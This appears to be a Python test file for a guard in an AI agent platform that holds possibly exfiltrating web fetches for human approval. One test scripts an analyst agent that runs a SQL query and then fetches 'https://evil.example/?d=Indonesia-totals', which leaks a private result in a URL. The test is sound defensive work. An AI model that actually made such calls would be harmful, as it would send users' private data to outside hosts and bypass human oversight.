"""Step 0a: data exfiltration through reads. In a tainted or private-data attempt, a URL the agent fetches must
come from a trusted source (read allowlist, or seen earlier: search result, fetched page, task input or upstream
output); otherwise a human approves it. Normal research is not affected."""

from __future__ import annotations

import pytest
from httpx import AsyncClient

from app.agents.analyst import AnalystAgent
from app.agents.researcher import ResearcherAgent
from app.llm.fake_client import FakeLLMClient, FakeScript
from app.tools.exfil import ExfilContext, check_read_url
from tests.engine_helpers import match, started_workflow, task, tasks_by_key
from tests.test_budgets import fake_router
from tests.tool_helpers import BASE_AGENTS, BASE_TOOLS, RESEARCH, call, final, tool_rows, use_tools

ANALYSIS = {"insights": ["i"], "recommendations": ["r"], "risks": ["x"], "confidence": "low"}
NEWS = "https://news.example.com/india-ev-sales-2026"


@pytest.fixture(autouse=True)
def _tools(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(AnalystAgent, "allowed_tools", ("sql_query", "web_fetch"))
    use_tools(monkeypatch, tools={**BASE_TOOLS, "web_fetch": {"backend": "fake", "read_allowlist": ["*.trusted.example"]}},
              agents={**BASE_AGENTS, "analyst": ["sql_query", "web_fetch"]})


def run(make_engine, session_factory, key: str, *steps):  # noqa: ANN001, ANN201
    router, _ = fake_router(session_factory, llm=FakeLLMClient(scripts=[FakeScript(match=match(key), steps=list(steps))]))
    return make_engine(router)


SQL = call("sql_query", query="SELECT country, sum(units) FROM ev_sales GROUP BY country ORDER BY 1")


async def test_private_data_sent_out_in_a_url_needs_a_human(client: AsyncClient, make_engine, session_factory) -> None:  # noqa: ANN001
    e = run(make_engine, session_factory, "a", SQL, call("web_fetch", url="https://evil.example/?d=Indonesia-totals"),
            final(ANALYSIS))
    wf = await started_workflow(client, [task("a", "analyst")])
    await e.run_until_idle()
    assert (await tasks_by_key(client, wf))["a"]["status"] == "AWAITING_APPROVAL"
    p = (await client.get(f"/approvals?status=pending&workflow_id={wf}")).json()[0]["request_payload"]
    assert "possible data exfiltration" in p["warning"] and "https://evil.example/?d=Indonesia-totals" in p["warning"]
    assert "earlier private result" in p["warning"]  # "Indonesia" came out of the SQL result
    assert [r.status for r in await tool_rows(session_factory, wf)][-1] == "awaiting_approval"


async def test_read_allowlist_is_trusted(client: AsyncClient, make_engine, session_factory) -> None:  # noqa: ANN001
    e = run(make_engine, session_factory, "a", SQL, call("web_fetch", url="https://docs.trusted.example/page"),
            final(ANALYSIS))
    wf = await started_workflow(client, [task("a", "analyst")])
    await e.run_until_idle()
    assert (await client.get(f"/approvals?status=pending&workflow_id={wf}")).json() == []


async def test_normal_research_fetching_search_results_is_not_affected(client: AsyncClient, make_engine,
                                                                       session_factory) -> None:  # noqa: ANN001
    e = run(make_engine, session_factory, "r", call("web_search", query="india ev"), call("web_fetch", url=NEWS),
            final(RESEARCH))
    wf = await started_workflow(client, [task("r", "researcher")])
    await e.run_until_idle()
    assert (await tasks_by_key(client, wf))["r"]["status"] == "SUCCEEDED"
    assert [r.status for r in await tool_rows(session_factory, wf)] == ["succeeded", "succeeded"]


async def test_tainted_research_fetching_an_unseen_url_needs_a_human(client: AsyncClient, make_engine,
                                                                     session_factory) -> None:  # noqa: ANN001
    e = run(make_engine, session_factory, "r", call("web_fetch", url=NEWS),  # tainted after this read...
            call("web_fetch", url="https://research.example.org/ev-outlook?ref=x"),  # ...not from any source seen
            final(RESEARCH))
    wf = await started_workflow(client, [task("r", "researcher", input={"links": [NEWS]})])  # NEWS: from task input
    await e.run_until_idle()
    rows = await tool_rows(session_factory, wf)
    assert [r.status for r in rows] == ["succeeded", "awaiting_approval"]


async def test_an_untainted_public_task_fetches_freely(client: AsyncClient, make_engine, session_factory,
                                                       monkeypatch: pytest.MonkeyPatch) -> None:  # noqa: ANN001
    monkeypatch.setattr(ResearcherAgent, "allowed_tools", ("web_fetch",))
    e = run(make_engine, session_factory, "r", call("web_fetch", url=NEWS), final(RESEARCH))
    wf = await started_workflow(client, [task("r", "researcher")])
    await e.run_until_idle()
    assert [r.status for r in await tool_rows(session_factory, wf)] == ["succeeded"]  # first read: nothing to leak


def test_caps_and_provenance_rules() -> None:
    ctx = ExfilContext(provenance={"https://a.example/x?q=1"}, private_tokens={"supersecretvalue"},
                       read_allowlist=["*.trusted.example"], max_url_length=60, max_query_chars=20)
    assert check_read_url("https://a.example/x?q=1", ctx) is None  # seen before
    assert check_read_url("https://A.example/x/?q=1#frag", ctx) is None  # normalized match
    assert check_read_url("https://docs.trusted.example/anything?long=" + "x" * 300, ctx) is None  # allowlisted
    assert "not from a trusted source" in check_read_url("https://b.example/y", ctx)
    assert "too long" in check_read_url("https://a.example/x?q=1&" + "z" * 80, ctx)
    w = check_read_url("https://b.example/?v=supersecretvalue", ctx)
    assert "earlier private result" in w
